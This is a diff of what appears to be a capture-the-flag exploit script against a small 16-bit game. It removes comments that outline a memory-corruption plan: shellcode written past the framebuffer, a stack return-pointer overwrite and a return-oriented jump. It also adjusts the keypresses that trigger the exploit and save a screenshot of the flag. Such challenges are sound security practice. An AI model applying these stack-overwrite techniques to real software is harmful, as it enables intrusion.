@@ -4,31 +4,10 @@ from subprocess import check_output
 import argparse
 import time
 
-"""
-basic exploit idea:
-    - use the cursor size to write controlled bytes off the edge of the framebuffer
-        - this is shellcode
-    - use a pair of missile lines to draw the address of the shellcode to top-of-stack + 1
-        - we will rop here
-        - we can control this *very* precisely since we can always open the cheat menu to enable it and then disable it
-            - could also just shoot a shot...
-            - except the explosion will fuck up our shellcode, if we're too close
-    - use a last missile line to change the top address on the stack (return ptr to main) to something pointing to a ret (overwrite lower-order-byte to point to one near the call in main)
-        - need to make sure a ret is in the same byte-area as that, but that's easy!
-            - currently exists, function above main has a ret. still confirm on final binary...
-    - exploit will now run!
-"""
 
 SCREEN_WIDTH = 320
 SCREEN_HEIGHT = 200
 TOP_OF_STACK = 0xF000
-FLAG_ADDR = 0x1231
-FLAG_LEN = 39
-
-def asm(s):
-    """ shell out to rasm2 to assemble... ugh """
-    print(s)
-    return unhexlify(check_output(['/usr/local/bin/rasm2', '-b', '16', s]).strip())
 
 
 class Client:
@@ -213,11 +192,8 @@ with Client(args.target, args.password, delay=args.delay) as client:
     # shellcode (somewhere on either nopsled, hopefully!)
     print('writing ret')
     client.set_cursor_value(0xff)
-    # TODO: these should be via the cheat menu!!
-    # enable trajectory, causes write
-    client.press_key('t')
-    # disable trajectory
-    client.press_key('t')
+    client.press_key('enter')
+    time.sleep(2) # wait for the trajectory to go
 
     print('Ok, it should have jumped to the finish!')
     print('Saving screenshot as flag.png')
